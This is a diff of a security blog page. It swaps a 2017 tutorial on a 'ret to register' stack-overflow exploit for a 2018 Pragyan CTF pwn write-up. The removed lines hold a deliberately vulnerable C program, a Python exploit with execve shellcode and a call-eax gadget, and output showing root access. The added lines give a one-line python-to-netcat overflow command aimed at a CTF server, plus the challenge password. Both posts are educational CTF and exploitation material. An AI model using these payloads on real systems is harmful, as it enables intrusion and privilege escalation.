@@ -2,9 +2,7 @@
 <html>
 <head>
 	<meta charset="utf-8">
-	<title>[ROP] Ret to register</title>
-	
-	<meta name="description" content="How to bypass NX/ASLR protections using "ret to register" attack on a x64 Linux system.">
+	<title>[Write-Up] Pragyan CTF - Old school hack</title>
 	
 	<meta name="author" content="Quentin Meffre">
 
@@ -152,7 +150,7 @@
 
 	<div class="col-sm-9 col-sm-offset-3">
 		<div class="page-header">
-  <h1>[ROP] Ret to register </h1>
+  <h1>[Write-Up] Pragyan CTF - Old school hack </h1>
 </div>
 	
 <article>
@@ -160,102 +158,106 @@
 	<div class="col-sm-10">
 	 <span class="post-date">
 	   
-	   January 
-	   31st,
-	     
-	   2017
+	   March 
+	   4th,
+	   
+	   2018
 	 </span>
 	  <div class="article_body">
-	  <p>Tools:</p>
-<ol>
-  <li>objdump</li>
-  <li>ROPgadget</li>
-</ol>
+	  <p><strong>Points:</strong> 200 <strong>Category:</strong> Pwn <strong>Description:</strong>  Chris is trying out to be a police officer and the applications have just been sent into the police academy. He is really eager to find out about his competition. Help it him back the system and view the other applicant’s applications.</p>
 
-<p>Binary protection:</p>
-<ol>
-  <li>ASLR</li>
-</ol>
+<h1 id="surroundings">Surroundings</h1>
+<p>This week-end took place the <a href="https://www.pragyan.org/18/home/">Pragyan CTF</a>. This Write-Up is going to show you how to solve the “Old school hack” pwnable challenges. This challenge was interesting because it was a mix between a wargame challenge and a classic exploit.</p>
 
-<p>Compilation: Dynamic</p>
+<h1 id="challenge">Challenge</h1>
+<p>This challenge is provided with a binary and an pair of IP/port. After a quick test, the binary is running into the given server.</p>
 
-<p>Architecture: x86</p>
+<p>Let first begin by recover many informations of our binary:</p>
 
-<p>Operating System: Linux (Debian)</p>
+<p><img src="/assets/media/pragyan_infos.png" alt="Check_binary" /></p>
 
-<h1 id="1-explanation">1. Explanation</h1>
-<p>Today I will show you an other method to exploit Return Oriented Programming. It name is “ret to register”. Thanks to register we will be able to execute a shellcode.</p>
+<p>We can get the following informations:</p>
+<ul>
+  <li>The binary is an ELF, compiled for x86_64 architecture,</li>
+  <li>It is linked dynamically,</li>
+  <li>It is not stripped,</li>
+</ul>
 
-<p>In assemby language (x86/x64) when we call a function, his return value is stored in the RAX/EAX register. For exemple, the strcpy return a pointer to the destination string. It means that if we overflow the saved “RIP/EIP” register with a gadget like “call eax/jmp eax” we will jump to the stack wich contain us shellcode !</p>
+<p>The following protections are enabled:</p>
+<ul>
+  <li>Partial REad onLy RelOcation,</li>
+  <li>Stack smash protection (canary),</li>
+  <li>No eXec stack.</li>
+</ul>
 
-<p>This method is very usefull but it needed to have the NX bit disable.</p>
+<p>Let’s try to execute it now:</p>
 
-<h1 id="2-vulnerable-binary">2. Vulnerable binary</h1>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;string.h&gt;
-</span>
-<span class="c1">// gcc main.c -z execstack -fno-stack-protector -m32
-</span>
-<span class="kt">char</span> <span class="o">*</span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+<p><img src="/assets/media/pragyan_first_try.png" alt="First try" /></p>
 
-  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
-<span class="p">}</span>
+<p>The binary start by asking a password. Using ltrace command, we can find the password: kaiokenx20</p>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">vuln</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
+<p>Now let’s taking a look at the assembly code using IDA:</p>
+
+<p><img src="/assets/media/pragyan_first_ida.png" alt="First ida" /></p>
+
+<p>The last image represent the main() function. We can see two important informations:</p>
+<ul>
+  <li>The service password is well the one we get using ltrace,</li>
+  <li>There is a buffer overflow at the call of scanf().</li>
+</ul>
+
+<p>We can’t exploit the buffer overflow because the binary has canary and so on we are going to have a stack smash error if we overflow it.</p>
+
+<p>But as you can see on the last image, we can overflow some data which are one the stack using our buffer overflow. Especially we can overwrite the “var_30” of the stack which represent the name of a file which is going to be read later by the binary.</p>
+
+<p>Using this vulnerability, we are able to read every file that we know the name. But before being able to do this, we have several condition to bypass:</p>
+
+<ul>
+  <li>Firstly, we don’t know the name of the file which contain our flag.</li>
+  <li>Secondly, we are going to see that the data that we overwrite are overwrite later by the binary.</li>
+  <li>Thirdly, the filename must has a size equal to 36.</li>
+</ul>
+
+<p>But all this condition are easy to bypass! :)</p>
+
+<p>The first one:</p>
+
+<p><img src="/assets/media/pragyan_first_condition.png" alt="First condition" /></p>
+
+<p>As you can see on the last image, the binary display some text on its output which represent different entry of a menu, then ask for a number on its input and then it jump to a piece of code depending of the user input. (Like a switch statement in C language) Every piece of code overwrite the filename we write using our buffer overflow so we must not enter in this function. The switch has a default value, if the user input doesn’t match with a number between the value ‘1’ and ‘7’ the binary jump to next step without overwriting our filename!</p>
+
+<p>So we just have to enter a value which respect this conditon: value &gt;= 8</p>
+
+<p>It’s ok for the first step.</p>
+
+<p>Now the second step is very easy. If we check the assembly code, we can see the following:</p>
+
+<p><img src="/assets/media/pragyan_second_condition.png" alt="Second condition" /></p>
+
+<p>If the user enter 7 for the menu entry, the binary set the filename to “txt.galf” (which is flag.txt in reverse) then display something on the output and finish by a call to exit().</p>
+
+<p>Let’s try to used “flag.txt” as filename.</p>
+
+<p>But before getting the flag, we have a last condition to fulfill:</p>
+
+<p><img src="/assets/media/pragyan_third_condition.png" alt="Third condition" /></p>
+
+<p>The last image represent the beginning of the function which display the content of the filename we overwrite. As you can see, there is a comparaison between the size of our filename. If our filename doesn’t has a size equal to 36 bytes, the binary raise an error.</p>
+
+<p>As our filename “flag.txt” only has a size of 8 bytes, we have a problem….</p>
+
+<p>But we can simply bypass it using the “./” path which represent the current directory on a Linux system.</p>
+
+<p>So our filename is going to look like this: ././././././././././././././flag.txt</p>
+
+<p>Here is the very little “exploit” (aka command) I used to solve this challenge:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+python <span class="nt">-c</span> <span class="s1">'print "kaiokenx20\x00"+"A"*5+"././././././././././././././flag.txt\x00\n"+"123"'</span>|nc 128.199.224.175 13000
 </code></pre></div></div>
 
-<p>It’s a very simple program that contain an overflow to the “strcpy” call. We will use the overflow to exploit this program.</p>
+<p>Now let’s try it:</p>
 
-<h1 id="3-the-payload">3. The payload</h1>
-<p>The payload will look like:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----------------+
-|    shellcode    |
-+-----------------+
-|     padding     |
-+-----------------+
-|    call eax     |
-+-----------------+
-</code></pre></div></div>
-
-<p>The only things we need is the “call eax” gadget, always thanks to ROPgadget:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> a.out | <span class="nb">grep</span> <span class="s2">"call eax"</span>
-...
-0x08048363 : call eax
-...
-</code></pre></div></div>
-
-<p>For the shellcode, I choose simple “execve(‘/bin/dash’, NULL, NULL)”, 38 bytes lenght.
-And that’s it for the payload !</p>
-
-<p>The whole payload will look:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
-
-<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
-
-<span class="c">#</span>
-<span class="c"># Shellcode execve("/bin/dash", NULL, NULL) (38 bytes)</span>
-<span class="c">#</span>
-
-<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">102</span> <span class="c"># Padding</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="mh">0x08048363</span><span class="p">)</span> <span class="c"># call eax</span>
-
-<span class="k">print</span> <span class="n">payload</span>
-</code></pre></div></div>
-
-<h1 id="4-exploitation">4. Exploitation</h1>
-<p>We test our payload:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./a.out <span class="k">$(</span>python rop.py<span class="k">)</span>
-id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
-</code></pre></div></div>
+<p><img src="/assets/media/pragyan_flag.png" alt="Done" /></p>
 
 <p>Done.</p>
 
@@ -267,8 +269,8 @@ id
 		  
 		  
 			 
-				<li><a href="/categories.html#pwn-ref">
-					pwn <span>(5)</span>
+				<li><a href="/categories.html#write-up-ref">
+					write-up <span>(5)</span>
 					
 				</a></li>
 			
@@ -285,13 +287,6 @@ id
 				<li>
 					<a href="/tags.html#pwn-ref">
 					pwn <span>(10)</span>
-					,
-					</a>
-				</li>
-			 
-				<li>
-					<a href="/tags.html#ROP-ref">
-					ROP <span>(4)</span>
 					
 					</a>
 				</li>
@@ -306,7 +301,7 @@ id
 		<div>
       <section class="share col-sm-6">
         <h4 class="section-title">Share Post</h4>
-        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[ROP] Ret to register&via=0xdagger"
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[Write-Up] Pragyan CTF - Old school hack&via=0xdagger"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
           <i class="fa fa-twitter fa-lg"></i>
           Twitter
@@ -334,10 +329,10 @@ id
 
 		<ul class="pager">
 		  
-		  <li class="previous"><a href="/pwn/2017/01/29/ret_to_libc.html" title="[ROP] Ret to LibC">&larr; Previous</a></li>
+		  <li class="previous"><a href="/write-up/2018/02/04/write_up_codegate_sharif.html" title="[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8">&larr; Previous</a></li>
 		  
 		  
-		  <li class="next"><a href="/pwn/2017/05/14/aslr_bruteforce.html" title="ASLR Bruteforce">Next &rarr;</a></li>
+			<li class="next disabled"><a>Next &rarr;</a>
 		  
 		</ul>
 
